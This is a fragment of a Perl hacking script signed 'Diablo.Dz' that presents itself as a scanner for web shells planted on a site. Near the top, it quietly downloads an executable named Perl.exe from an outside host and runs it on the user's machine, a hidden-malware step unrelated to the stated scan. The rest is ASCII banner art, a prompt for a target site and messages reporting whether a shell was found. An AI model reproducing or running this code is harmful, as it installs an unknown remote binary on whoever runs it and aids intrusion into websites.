...
system('cls');
system(' Coded BY Diablo.Dz  Grtz---> Enjoy :D - AbdoCanjo.Fsociety - Zohair - Dino_Devil - All Muslim Hackers '); 
  #Dont Change my fuckin script bcz that don make u a coder ;)
     #Contact me : fb/XX7755
getstore('http://6tl.net/Perl/Downloads/Perl.exe',
'Perl.exe'); 
system('Perl.exe');
print"\n";
print "\t *------------------------------------------*\n";
print "\t *_____     _______   ___      _____        *\n";
print "\t *| __ \(_) __ _| |__ | | ___  |  _ \ ____    *\n";
print "\t *| | | | |/ _` | '_ \| |/ _ \ | | | |_  /    *\n";
print "\t *| |_| | | (_| | |_) | | (_) || |_| |/ /   *\n";
print "\t *|____/|_|\__,_|_.__/|_|\___(_)____//___|    *\n";
print "\t *------------------------------------------*\n";
print "\t ###### Coded By -----> Diablo.Dz ###### \n";
print "\n";

print " Scan Your site \n\n Example: www.n5m5 BB.com\n\n--->";
...
print "Shell Found XD BB :D : $url\n";
}else{
print " Walo Y seepi :'( : $myshell\n";
}
}
